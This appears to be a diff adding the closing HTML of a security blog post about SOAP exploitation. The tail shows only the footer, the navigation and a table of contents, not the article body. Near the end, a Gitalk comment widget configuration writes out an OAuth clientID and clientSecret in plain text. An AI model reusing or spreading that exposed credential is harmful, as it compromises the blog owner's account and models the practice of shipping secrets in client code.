+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/soap/" rel="tag"><i class="fa fa-tag"></i># soap</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/01/11/2019-1-12-内网渗透tips①/" rel="next" title="内网渗透tips">
+                <i class="fa fa-chevron-left"></i> 内网渗透tips
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/01/12/2019-1-12-ImageMagick安全详解/" rel="prev" title="ImageMagick安全详解">
+                ImageMagick安全详解 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-SOAP基础知识"><span class="nav-number">1.</span> <span class="nav-text">0x01 SOAP基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-SOAP的基本概念"><span class="nav-number">1.1.</span> <span class="nav-text">1.SOAP的基本概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-SOAP的组成"><span class="nav-number">1.2.</span> <span class="nav-text">2.SOAP的组成</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-SOAP漏洞利用之代码注入（一）"><span class="nav-number">2.</span> <span class="nav-text">0x02 SOAP漏洞利用之代码注入（一）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-SOAP漏洞利用之CRLF与SSRF（二）"><span class="nav-number">3.</span> <span class="nav-text">0x03 SOAP漏洞利用之CRLF与SSRF（二）</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
